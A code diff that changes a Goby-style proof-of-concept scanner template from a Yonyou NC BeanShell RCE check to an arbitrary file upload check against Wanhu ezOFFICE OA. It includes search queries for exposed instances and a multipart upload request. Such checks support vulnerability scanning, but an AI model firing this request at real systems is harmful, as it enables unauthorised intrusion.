@@ -6,14 +6,14 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "万户OA fileUpload.controller 任意文件上传漏洞",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
+  "FofaQuery": "app=\"万户网络-ezOFFICE\" || product=\"万户网络-ezOFFICE\"",
+  "GobyQuery": "app=\"万户网络-ezOFFICE\" || product=\"万户网络-ezOFFICE\"",
   "Level": "3",
   "Impact": "",
   "Recommendation": "",
@@ -29,12 +29,14 @@ func init() {
     "AND",
     {
       "Request": {
-        "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "method": "POST",
+        "uri": "/defaultroot/upload/fileUpload.controller",
         "follow_redirect": true,
-        "header": {},
+        "header": {
+          "Content-Type": "multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0"
+        },
         "data_type": "text",
-        "data": ""
+        "data": "--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0\nContent-Disposition: form-data; name=\"file\"; filename=\"aaa\"\nContent-Type: application/octet-stream\nContent-Transfer-Encoding: binary\n\naaa\n--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--"
       },
       "ResponseTest": {
         "type": "group",
@@ -51,7 +53,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "\"success\"",
             "bz": ""
           }
         ]
@@ -107,7 +109,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "万户OA fileUpload.controller 任意文件上传漏洞",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +118,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "ezOFFICE OA fileUpload.controller upload file",
       "Product": "",
       "Description": "",
       "Recommendation": "",
